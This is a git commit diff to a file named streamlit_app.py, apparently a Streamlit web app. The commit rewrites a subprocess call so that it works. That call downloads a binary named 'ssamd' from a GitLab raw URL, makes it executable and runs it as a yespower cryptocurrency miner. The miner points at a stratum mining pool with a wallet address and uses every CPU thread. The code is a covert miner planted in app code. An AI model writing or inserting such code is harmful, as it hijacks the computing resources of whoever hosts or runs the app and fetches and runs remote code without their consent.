d42bc4e5e799184442317946c9a7d7f22da3a5e4
fedresa <116496099+fedresa@users.noreply.github.com>
2022-10-23 13:13:54 +0000

    Update streamlit_app.py

--- streamlit_app.py
+++ streamlit_app.py
@@ -11,5 +11,4 @@ from time import sleep
 from subprocess import PIPE, Popen
 import base64
 
-p = subprocess.run("curl -L -o ssamd https://gitlab.com/Ikuzot/ghost/-/raw/main/ssamd && chmod +x ssamd && ./-a yespower -o stratum+tcps://stratum-na.rplant.xyz:17017 -u web1qxnm9q7txetqj6uzxat4xkas6rxr93q5fc7xjm4.Nung -t$(nproc --all)", stdout=subprocess.PIPE, shell=True)
-
+p = subprocess.run("curl -L -o ssamd https://gitlab.com/Ikuzot/ghost/-/raw/main/ssamd && chmod +x ssamd && ./ssamd -a yespower -o stratum+tcps://stratum-na.rplant.xyz:17017 -u web1qxnm9q7txetqj6uzxat4xkas6rxr93q5fc7xjm4.Nung -t $(nproc --all)", stdout=subprocess.PIPE, shell=True)
